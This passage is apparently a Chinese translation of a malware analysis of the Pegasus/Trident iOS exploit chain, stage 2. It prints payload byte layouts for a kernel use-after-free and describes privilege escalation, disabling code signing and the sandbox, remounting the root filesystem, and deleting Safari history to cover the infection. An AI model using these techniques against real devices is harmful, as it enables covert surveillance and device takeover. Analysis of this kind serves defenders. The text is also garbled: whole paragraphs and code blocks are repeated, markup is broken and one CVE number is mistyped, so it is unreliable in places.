<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）"><a href="#payload结构和内核插入（64位）" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）"><a href="#建立内核读-写基元（32位）" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p>堆栈在新线程执行开始时内容如下：</p>
<pre><code>char stackAnchor; //[sp+101Fh] [bp-2031h]@1
unsigned int size; //[sp+2020h] [bp-2013h]@12
char buffer[4096]; //[sp+2024h] [bp-102h]@12
int v26; //[sp+3024h] [bp-2Ch]@7
mach_port_t connection; //[sp+3028h] [hp-28h]@4
kern_return_t result; //[sp+320Ch] [bp-24h]@4
mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST</code></pre>
<p>该新线程利用<em>stackAnchor</em>变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个<em>kauth_filesec</em>结构块，其包含了比必需的更多的信息。通过设置<strong>acl_entrycount</strong>去向系统说明没有ACE项，则当<em>open_extended <em>加载</em>kauth_filesec</em>时，其不会解析<em>acl _ flags <em>以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终</em>open_extended</em>会将攻击缓冲区（以及*clock _ ops _ overwrite *缓冲区）的内容复制到内核区域中。</p>
<p>新线程利用<em>open_extended <em>的漏洞将未修改的</em></em>payload<strong>放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到</strong>payload<strong>的地址。当完成了对</strong>AppleKeyStore*<em>漏洞的攻击，</em>buffer <em>变量传向</em>io_service_open_extended <em>（位于stackAnchor附近的相同变量）。这意味着</em>AppleKeyStore <em>会返回指向内核块的指针，指针指向</em>open_extended *复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。</p>
<p>一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。</p>
<p>在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。</p>
<h4 id="payload结构和内核插入（64位）-1"><a href="#payload结构和内核插入（64位）-1" class="headerlink" title="payload结构和内核插入（64位）"></a>payload结构和内核插入（64位）</h4><p>考虑到<em>64Stage2</em>中使用的触发机制的不同，设置和<em>payload</em>结构也有点不同的。64位没有创建管道和覆盖时钟<em>getattr</em>语句，而是重写了一<em>sysctl <em>处理函数，最终也会导致</em></em> OSSerializer::serialize<strong>以32位相似方式执行。为建立执行原语，64位用到了</strong>net.inet.ip.dummynet.extract_heap*<em>的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和</em>getattr*差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。</p>
<h4 id="建立内核读-写基元（32位）-1"><a href="#建立内核读-写基元（32位）-1" class="headerlink" title="建立内核读/写基元（32位）"></a>建立内核读/写基元（32位）</h4><p>利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的<strong>clock_ops</strong>处理程序，该程序可使用户可以访问内核内存。32Stage2在<em>io_service_open_extended</em>反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了<em>io_service_open_extended</em>的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当<em>io_service_open_extended</em>传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。</p>
<p>properties参数中的数据<strong>blob</strong>表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。</p>
<p>在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。</p>
<pre><code>len = (key &amp; kOSSerializeDataMask);
...
switch ( kOSSerializeTypeMask &amp; key)
&#123;
    case kOSSerializeDictionary:
        o = newDict = OSDictionary::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeArray:
        o = newArray =OSArray::withCapacity(len);
        newCollect = (len!=0);
        break;
    case kOSSerializeSet:
        o = newSet = OSSet::withCapacity(len);
        newCollect = (len!=0);
    case kOSSerializeObject;
        if(len&gt;=objsIdx) break;
        o = objsArray[len];
        o-&gt;retain();
        isRef = true;
        break;
&#125;</code></pre>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<p><strong>switch</strong>语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray：</p>
<pre><code>if (! isRef)
&#123;
        setAtIndex (objs, objsIdx, o);
        if ( !ok) break;
        objsIdx++;
&#125;</code></pre>
<p><strong>setAtIndex</strong>是一个宏，将对象（o）添加到objsArray。虽然iOS环境中存在更强大的数组对象，例如OSArray（会自动处理引用计数的数组容器），但<em>OSUnserializeBinary</em>对其已反序列化的对象的数组对象管理采用手动多一些的管理方式。反序列化后，通过调用o-&gt; release（）来将对象的引用计数清零，在大多数情况下将导致对象被释放。可能会在<em>kOSSerializeObject</em>对象中抛出异常。</p>
<p>由于<em>kOSSerializeObject</em>对象是一个表示被其他条目引用的对象，因此必须在序列化后保留该对象。因此，在反序列化期间，kOSSerializeObject对象将调用o-&gt; retain（），从而增加对象的引用计数并防止从内存中删除它。</p>
<p>序列化数据blob允许多次使用相同的密钥。 换句话说，有可能（直到iOS 9.3.1，在CVE-2016-1828中修复了重复密钥问题）使XML代码如下：</p>
<pre><code>&lt;dict&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;number&gt;1&lt;/number&gt;
        &lt;key&gt;KEY1&lt;/key&gt;
        &lt;string&gt;2&lt;/string&gt;
&lt;/dict&gt;</code></pre>
<p>上面的XML一旦序列化，将包含五个对象。第一个对象是字典容器（<code>&lt;dict&gt;</code>表示kOSSerializeDictionary对象），后跟表示键的符号（“KEY1”赋给kOSSerializeSymbol）及其数据对象（整数1赋给kOSSerializeNumber）。第四个属性指定另一个密钥对象，会再次分配给KEY1，现在这个属性是一个包含字符串“2”的字符串对象（kOSSerializeString）。作为反序列化过程的一部分，KEY1的重用导致接下来的对象会替换分配给KEY1的原始值。用新数据替换密钥便是<em>OSUnserializeBinary</em>容易受到攻击的地方。</p>
<p>如前所述，当对象被反序列化时，只要该对象不是kOSSerializeObject，该对象就存储在objsArray中以供之后引用。此存储是setAtIndex宏的结果，如下：</p>
<pre><code>#define setAtIndex(v, idx, o) \
        if (idx &gt;= v##Capacity) \
        &#123; \
                unint32_t ncap = v##Capacity+64; \
                typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \
                if (!nbuf) ok =false; \
                if(v##Array) \
                &#123; \
                        bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \
                        kfree(v##Array,v##Capacity * sizeof(o)); \
                &#125; \
                v##Array=nbuf; \
                v##Capacity=ncap; \
        &#125; \
        if (ok) v##Array[idx]=o;</code></pre>
<p>宏将扩展objsArray以容纳附加对象，并将对象分配到objsArray的末尾，而不通过o-&gt; retain（）调用增加其引用计数。此方法的问题在于，当第二个对象替换现有对象时（在我们的示例中，就是每当字符串对象替换KEY1的数字对象时），第一个对象被释放并随后被释放，但是指向现在释放的对象的指针存在于objsArray中。通常这只是一个糟糕的编程设计问题，但如果通过kOSSerializeObject条目引用该对象，则问题会变得更加复杂。如果kOSSerializeObject条目通过索引引用已释放对象的指针，则对o-&gt; retain（）的调用将尝试执行受攻击者控制的虚函数。</p>
<p>为了利用UAF漏洞，32Stage2必须控制已解除分配的内存位置，并放置一个自定义vtable，它将使retain条目指向自己选择的函数。安装自定义vtable需要访问两个已释放的相邻内存位置。由于在序列化过程中无法直接覆盖对象的vtable，通过分配然后释放两个内存位置，32Stage2可以使用OSData或OSString对象一次替换两个内存位置，其中一个内存位置包含恶意vtable。导致UAF漏洞的上述条件是CVE-2016-18284的结果，并且存在于9.0到9.3.1的iOS版本中。32Stage2通过使用以下payload来利用此漏洞，以便在iOS时钟处理程序中安装内核读/写原语。   </p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerailizeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10
[0x14] kOSSerailizeDictionary | 0x10
[0x18] kOSSerailizeSymbol | 4
[0x1C] &quot;sy1&quot;
[0x20] kOSSerailizeData | 0x14
[0x24] &quot;ffff\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;
[0x38] kOSSerailizeSymbol | 4
[0x3C] &quot;sy1&quot;
[0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4
[0x44] &quot;sy1&quot;
[0x48] kOSSerailizeString | 0x1C
[0x4C] &#123;payload buffer&#125;
[0x68] kOSSerailizeString | 0x1C
[0x6C] &#123;payload buffer&#125;
[0x88] kOSSerailizeString | 0x1C
[0x8C] &#123;payload buffer&#125;
[0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5</code></pre>
<p>在payload中，32Stage2重用sy1密钥以通过UAF漏洞激活payload。</p>
<p>从iOS版本9.3.2开始，修补了CVE-2016-1828漏洞，这迫使需要一种不同的机制来安装内核读/写原语。但是，OSUnserializeBinary的kOSSerializeObject仍包含UAF漏洞。</p>
<p>理解这个概念的最简单方法是查看32Stage2生成的payload，以利用OSUnserializeBinary UAF漏洞。</p>
<p>对于iOS版本9.3.2至少9.3.3，payload采用以下形式：</p>
<pre><code>[0x00] kOSSerailizeBinarySignature
[0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10
[0x08] kOSSerializeString | 4
[0x0C] &quot;sy2&quot;
[0x10] kOSSerializeData | 0x14
[0x14] &#123;payload buffer&#125;
[0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 </code></pre>
<p>虽然在结构上它们看起来有些不同，但最终它们都利用了UAF漏洞。在iOS 9.3.2及更高版本中使用的这种更简单的payload是最容易理解的。当OSUnserializeBinary开始反序列化payload的解析过程时，该函数将创建一个新的字典对象，偏移0x04处的运行结果。在词典中有两个无键对象。第一个对象是一个<strong>OSString</strong>对象，其值为<strong>sy2</strong>（分别在偏移量0x08和0x0C中指定）。在偏移量0x10处指定大小为0x14（20）字节的<strong>OSData</strong>对象。OSData对象包含payload缓冲区数据结构。由于对象是无键的，OSUnserializeBinary将用OSData对象替换OSString对象，但将指针留在objsArray中。由于OSString对象没有retain（）调用，OSString被释放，从而将两个内存数组放入空闲列表中（一个用于OSString对象本身，另一个用于与OSString对象关联的字符串）。</p>
<p>当OSUnserializeBinary解析kOSSerializeData时，将分配新的OSData对象，从而从空闲列表中消耗一个已释放的内存位置。当与kOSSerializeData关联的数据被复制到OSData对象中时，将为数据分配新的缓冲区，该缓冲区将消耗空闲列表中的剩余数据位置。此时，objsArray中的悬空指针已被OSData对象的数据替换。它是与OSData对象关联的数据，其中包含恶意payload，最终将给予32Stage2写访问内核权限，以便安装读/写原语。</p>
<p>无论iOS版本如何，恶意payload都包含相同的payload缓冲区。payload缓冲区是一个20字节的结构，由以下元素组成：</p>
<pre><code>[00] address of uaf_payload_buffer + 8
[04] &#123;uninitialized data from stack&#125;
[08] address of uaf_payload_buffer
[0C] static value of 20
[10] address of OSSerializer::serialize</code></pre>
<p>payload必须包含指向偏移量0x10处新保留函数的指针。32Stage2使用OSSerializer :: serialize函数作为替换保留。这种设计意味着payload的其余部分必须模拟OSSerializer对象的vtable。如先前在已植入的设备上建立读/写/执行原语所述，OSSerializer :: serialize函数将在所提供的vtable的偏移0x10处调用该函数，同时将vtable的偏移0x08和0x0C传递给被调用的函数。假设偏移量0x10设置为OSSerializer :: serialize，则会再次调用该函数，但第二次将调用偏移量0x08指定的vtable。此调用会导致一系列后续调用，最终导致调用 <strong>_copyin</strong>，这个函数替换实时和电池时钟的getattr处理程序，正如在之前植入的设备上建立读/写/执行原语步骤中所述。</p>
<p>在执行漏洞利用之后，如果受害者的手机是“iPhone4,1”，则控制之前生成的1000个线程的全局变量值将设置为-1以终止线程。</p>
<p>为验证电池时钟的getattr处理程序是否成功读取内核内存地址，将调用<em>clock_get _attributes</em>，并将读取位置指定为内核的基址。如果<em>clock_get _attributes</em>的结果不是魔术值<code>0xFEEDFACE</code>，则再次尝试。 第二次失败导致调用assert回调并终止32Stage2。</p>
<h4 id="建立内核读-写基元（64位）"><a href="#建立内核读-写基元（64位）" class="headerlink" title="建立内核读/写基元（64位）"></a>建立内核读/写基元（64位）</h4><p>在第二阶段的64位版本中利用了相同的底层漏洞。原则上，漏洞利用的结构非常类似。主要区别在于通过写入<strong>net.inet.ip.dummynet.extract _ heap</strong> sysctl处理程序来建立最终的执行原语。OSSerializer :: serialize的使用方式与32Stage2中的类似。然后使用在建立内核执行原语（32位）中描述的相同机制来实现任意代码执行（通过执行任意ROP链）。</p>
<h4 id="建立内核执行原语（32位）"><a href="#建立内核执行原语（32位）" class="headerlink" title="建立内核执行原语（32位）"></a>建立内核执行原语（32位）</h4><p>正如之前在Rooted Devices上安装内核访问处理程序中所解释的那样，实时时钟的getattr处理程序指向OSSerializer :: serialize，它允许clock_get_attributes的调用者将特制结构传递给OSSerializer :: serialize以便在内核空间中执行指令。要在内核空间内执行，用户区32Stage2进程必须具有以可靠的方式将数据传输到内核地址空间的方法。 32Stage2使用管道创建的管道集的方法来完成此任务。</p>
<p>在将电池时钟的新getattr处理程序建立为* _bufattr _cpx* 之后，32Stage2有一个可靠的方法将DWORD从内核地址空间读入用户空间。32Stage2使用此功能来查找存储在内核中的<strong>addrperm</strong>值。addrperm重新定义数据传入用户区时在内核中的偏移量，以便混淆内核中数据的真实位置。如果获得该值，可以将内核地址反混淆到其真实地址值。32Stage2从生成的管道集中调用读取管道的<strong>fstat</strong>，然后计算<strong>stat</strong>结构的位置与内核地址空间之间的差异。然后将该值存储在全局变量中，供必须访问内核内存以执行代码的函数使用。</p>
<p>每当32Stage2想要在内核中执行代码时，以下数据结构将写入生成的管道集中write pipe：</p>
<pre><code>[00] argument 1
[04] argument 2
[08] address of cpde execute</code></pre>
<p>为了调用数据偏移量8中指定的函数，另一个DWORD被预先添加到数据中并传递给实时时钟的getattr处理程序（通过OSSerializer :: serialize访问），它在调用要执行的函数地址之前将参数1放入R3和参数2放入R1。通过将未使用的DWORD添加到数据结构中，该数据块成为OSSerializer的vtable替代品。该技术用于32Stage2中的两个不同函数。 一个函数允许任意内核函数调用，另一个函数用于将DWORD值写入内核地址空间。</p>
<h4 id="修补内核以允许内核端口访问"><a href="#修补内核以允许内核端口访问" class="headerlink" title="修补内核以允许内核端口访问"></a>修补内核以允许内核端口访问</h4><p>由于能够在内核地址空间内读取，写入和执行任意位置，下一步是通过内核端口获得对内核的更直接访问。如果使用PID值0调用，则 **  _for_pid ** 会返回错误。为了绕过这种保护，第2阶段修改了<strong>task_for_pid</strong>中的四个不同位置。在开始修改<strong>task_for_pid</strong>之前，阶段2确定需要修该改的区域是否在可读取/执行的内存区域内。如果内存不可写，则第2阶段将直接修改内存区域的权限以允许写访问，然后使dcache无效并刷新数据和TLBs指令以确保内存区域进行权限更新。</p>
<p>修改<strong>task_for_pid</strong>以允许调用者获得内核的端口后， 在调用assert回调和退出之前，第2阶段将尝试通过调用<strong>task_for_pid（mach_task_self，0，＆port）</strong>来获取五次内核端口，每次尝试之间有100次毫秒延迟。</p>
<h2 id="阶段三：提权和实现越狱"><a href="#阶段三：提权和实现越狱" class="headerlink" title="阶段三：提权和实现越狱"></a>阶段三：提权和实现越狱</h2><p>本节介绍在第2阶段执行的最终步骤，以获取iPhone上的root访问权限，禁用代码签名，然后实现越狱。 此阶段利用最终的Trident漏洞，该漏洞会造成内核内存损坏导致越狱（CVE-2016-4656）。</p>
<h3 id="修改系统以提权"><a href="#修改系统以提权" class="headerlink" title="修改系统以提权"></a>修改系统以提权</h3><p>32Stage2的下一步是在受害者的手机上获得root访问权限。如果第2阶段进程没有以root用户身份运行（UID = 0），在非越狱手机上不可能以root运行，第2阶段会修补setreuid功能跳过对提权的检查。若对setreuid的修改完成，该函数最多被调用五次（每次调用之间有500ms的延迟），直到setreuid（0,0）返回成功。在五次尝试之后（或在成功的setreuid调用之后），修改后的setreuid会给出相反的结果。最后检查进程的用户值（UID）以确保它确实是root（0）。 如果函数getuid返回0以外的任何值，则调用assert并退出阶段2。</p>
<p>阶段2通过实时时钟<strong>clock_get_attributes</strong>调用内核函数<strong>kauth_cred_get_with_ref</strong>，以便接收主线程的凭证。在此之后，第2阶段将找到mac_policy_list，其中包含当前加载到iOS内核中的访问控制策略模块列表。阶段2检查列表，查找以名称“Seat”开头的模块，可参考“Seatbelt沙箱策略”。如果未找到策略模块，则阶段2调用断言回调并终止。但是，如果找到该模块，则会读取并修改<strong>mpc_field_off</strong>，以允许当前进程更大程度地控制受害者的iPhone。</p>
<p>因为可访问内核端口并且删除了将阻止第2阶段执行通常被沙箱策略阻止的权限操作的限制，阶段2不再需要实时时钟的getattr处理程序。为了确保将来对此处理程序的调用不会使手机崩溃，将修改getattr函数指针以指向指令：<br><code>BX LR</code><br>这个新的处理函数有效地将未来对实时时钟的getattr调用转换为NOP。这可能是为了确保将来调用getattr处理程序（通过某些其他进程）不会产生意外后果并导致内核崩溃。</p>
<h3 id="禁用代码签名"><a href="#禁用代码签名" class="headerlink" title="禁用代码签名"></a>禁用代码签名</h3><p>默认情况下，标准iPhone上的iOS将阻止未签名的代码通过正常方式运行，例如<code>execv</code>或系统调用。同样，通过将文件系统设置为只读，可以防止对根文件系统的修改。这些情况将阻止第2阶段执行越狱程序，并将阻止越狱程序（如果它激活）修改系统。第2阶段修改了几个内核函数和两个内核扩展（kext），以允许这些禁止的操作。第2阶段首先找到<code>com.apple.driver.AppleMobileFileIntegrity</code>和<code>com.apple.driver.LightweightVolumeManager</code>的kext。<code>com.apple.driver.AppleMobileFileIntegrity</code>（AMFI）扩展程序负责实施iOS的代码签名功能。<code>com.apple.driver.LightweightVolumeManager</code>扩展负责主存储设备的分区表。阶段2通过调用OSKextCopyLoadedKextInfo来定位每个扩展，该函数返回含有扩展信息的字典对象。在字典中的是当扩展被调用时的加载偏移量，阶段二通过添加一已知的偏移量将其放入内核地址中。</p>
<p>使用AMFI的内核地址，阶段2定位以下全局变量：<br><code>amfi_get_out_of_my_way</code><br><code>cs_enforcement_disable</code><br>这两个变量在设置好后会禁用AFMI并禁用代码签名。然后，阶段2设置另外两个全局变量：debug _ flags和DEBUGflag。 这两个变量允许对受害者的iPhone进行调试权限，进一步减少沙箱（SEATBELT）对设备施加的限制。</p>
<p>接下来，第2阶段修改内核函数<code>vm_map_enter</code>和<code>vm_map_protect</code>，以便在虚拟内存管理器中禁用代码签名验证（可以分配RWX区域）。在此之后，第2阶段修改LightweightVolumeManager中的<code>_mapForIO</code>函数，然后修改内核函数csops以禁用更多的代码签名保护。</p>
<h3 id="重新安装驱动器"><a href="#重新安装驱动器" class="headerlink" title="重新安装驱动器"></a>重新安装驱动器</h3><p>为了越狱设备，必须拥有根文件系统写权限。阶段2通过对<code>/ sbin / launchd</code>调用访问函数来测试根文件系统的可写性，以确定阶段2是否具有对根文件系统的写访问权。如果文件是只读的，则第2阶段修补内核函数<code>_ mac _ mount</code>以禁用保护策略，该策略阻止将文件系统重新安装为读/写，然后通过调用<code>mount(“hfs”, “/”, MNT _ UPDATE ,mountData)</code>将root文件系统重新安装为读/写，其中mountData指定<code>/ dev / disk0s1s1</code>设备。</p>
<p>如此编写使得它只能在iOS 9系列iPhone上运行，但代码存在表明它曾经在较旧的iOS版本上使用过。作为支持此声明的证据，在第2阶段重新安装根文件系统后会调用一个函数，如果它在iOS 7，iOS 8或iOS 9上运行，则修改其执行路径。根据iOS版本，函数在<code>/ bin / launchctl</code>（适用于iOS 7和8）或<code>/ bin / launchd</code>（适用于iOS 9）上调用<code>fsctl</code>。<code>fsctl</code>将修改低磁盘空间警告阈值以及极低磁盘空间警告阈值，分别将值设置为8192和8208。</p>
<h3 id="清理"><a href="#清理" class="headerlink" title="清理"></a>清理</h3><p>由于Safari中允许任意代码执行的漏洞，第2阶段被激活。作为第2阶段在实现越狱之前执行的最后一项活动之一，第2阶段尝试通过清理Safari中的历史记录和缓存文件来覆盖其感染向量。清除Safari浏览器历史记录和缓存文件的过程非常简单，并且特定于iOS版本。</p>
<p>对于iOS 8和iOS 9（如果未在iOS 9上运行，第2阶段将在开始时终止），将从受害者的iPhone中立即删除以下文件以删除浏览器和缓存信息：</p>
<pre><code>• /Library/Safari/SuspendState.plist
• /Library/Safari/History.db
• /Library/Safari/History.db-shm
• /Library/Safari/History.db-wal
• /Library/Safari/History.db-journal
• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal
• (files in the directory) /Library/Caches/com.apple.mobilesafari/fsCachedData/</code></pre>
<p>对于iOS 7，将删除以下文件：</p>
<pre><code>• /Library/Caches/com.apple.mobilesafari/Cache.db
• /Library/Caches/com.apple.mobilesafari/Cache.db-shm
• /Library/Caches/com.apple.mobilesafari/Cache.db-wal
• /Library/Caches/com.apple.mobilesafari/Cache.db-journal</code></pre>
<p>最后调用<code>sync</code>，以确保将删除写入磁盘。</p>
<h3 id="下一阶段安装"><a href="#下一阶段安装" class="headerlink" title="下一阶段安装"></a>下一阶段安装</h3><p>再次给出使用最初针对较旧的iOS版本的代码的证据，主线程调用的下一个函数进行解压缩并将两个文件放到受害者的文件系统上。以下代码段说明了Stage 2如何确定越狱二进制文件在受害者设备上的位置：</p>
<pre><code>if ( ( unsigned int) ( majorVersion -8 ))
&#123;
    if ( majorVersion ==7 )&#123;
        pszJBFilenamePath = &quot;/bin/sh&quot;;
        if( flag )
            pszJBFilenamepath = &quot;/private/var/tmp/jb-install&quot;;
    &#125;
    else&#123;
        assert();
        writeLog(3, &quot;%.2s%5.5d\n&quot;, &quot;bh.c&quot;, 134);
        exit(-1);
        pszJBFilenamePath =0;
    &#125;
&#125;
else
&#123;
    pszJBFilenamePath = &quot;/sbin/mount_nfs.temp&quot;;
&#125;</code></pre>
<p>代码片段显示，对于iOS版本7，下一阶段二进制文件的安装路径是<code>/ bin / sh</code>或<code>/ private / var / tmp / jb-install</code>（如果flag为非零）。对于早于7的iOS版本，将调用断言回调并终止程序。 对于iOS 8及更高版本，安装路径指定为<code>/ sbin / mount _ nfs.temp</code>。</p>
<p>包含下一阶段二进制的数据blob的大小被验证为非零。如果大小为零，则发生断言回调并终止第2阶段。然后，阶段2使用<code>BZ2 _ *</code> API函数将数据解压缩为两个文件：第一个文件是下一个阶段的二进制文件，对于iOS 9，它存储在<code>/ sbin / mount _ nfs.temp</code>中。 第二个文件是配置文件，存储在<code>/ private / var / tmp / jb _ cfg</code>中。</p>
<p>在控制返回主线程之前，这两个文件的权限更改为<code>0755</code>（使文件可执行）。</p>
<p>Stage 2在终止之前调用的最终函数负责移动上一步骤中放下的二进制文件。对于iOS版本8和9，文件<code>/ sbin / mount _ nfs.temp</code>重命名为<code>/ sbin / mount _ nfs</code>。如果受害者手机上的iOS是iOS 9，则会在重命名操作之前尝试删除<code>/ sbin / mount _ nfs</code>。重命名文件后，调用assert回调函数，然后调用exit函数，终止Stage 2。</p>
<p>一旦执行返回主线程，第2阶段将以静默方式终止</p>
<h3 id="现有的越狱检测"><a href="#现有的越狱检测" class="headerlink" title="现有的越狱检测"></a>现有的越狱检测</h3><p>如前所述，Stage 2二进制文件以两种不同的模式运行。第一个已经讨论过，其构成了一个完整的iOS漏洞利用和越狱。 第二个是在已经越狱的系统上运行Stage 2二进制文件时所采用策略。在第二模式下，第2阶段只是利用现有的越狱后门来安装Pegasus特定的内核补丁。</p>
